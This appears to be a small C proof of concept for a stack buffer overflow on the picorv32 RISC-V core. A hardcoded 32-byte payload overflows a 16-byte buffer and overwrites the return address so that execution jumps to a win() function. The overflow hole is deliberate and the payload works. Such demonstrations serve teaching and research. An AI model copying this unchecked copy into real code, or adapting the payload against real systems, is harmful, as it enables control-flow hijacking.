#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* PoC of ROP for picorv32 (XLEN of 32) */

/* example function which is not supposed to be called */
void win() {
    printf("PoC\n");
    exit(0); /* we should exit here or else 
                        it will call win function in a loop
                        since 'ra' register will have this 
                        functions address by here */
}

void memcpy_vuln(char *target) {
    /* example payload for buffer overflow */
    /* 0x0000001c is the address of the win function */
    /* make sure 'ra' register gets overriten by this address */
    memcpy(target, "AAAAAAAABBBBBBBBCCCCCCCCDDDD\x1c\0\0\0", 32);
}

int main() {
    /* 16 bytes of buffer */
    char arr[16];

    printf("Hello from picorv32!\n");
    /* arbitary size of input */
    memcpy_vuln(arr);

    return 0;
}
